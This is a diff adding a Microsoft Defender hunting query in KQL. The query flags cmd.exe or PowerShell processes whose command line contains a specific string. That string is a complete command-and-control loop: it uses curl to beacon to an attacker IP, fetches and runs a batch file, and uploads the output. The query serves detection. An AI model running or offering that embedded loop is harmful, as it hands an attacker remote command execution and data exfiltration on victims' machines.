@@ -1,0 +1,4 @@
+DeviceProcessEvents
+| where FileName == "powershell.exe" or FileName == "cmd.exe"
+| where InitiatingProcessCommandLine contains "&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X **** -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1\" "
+
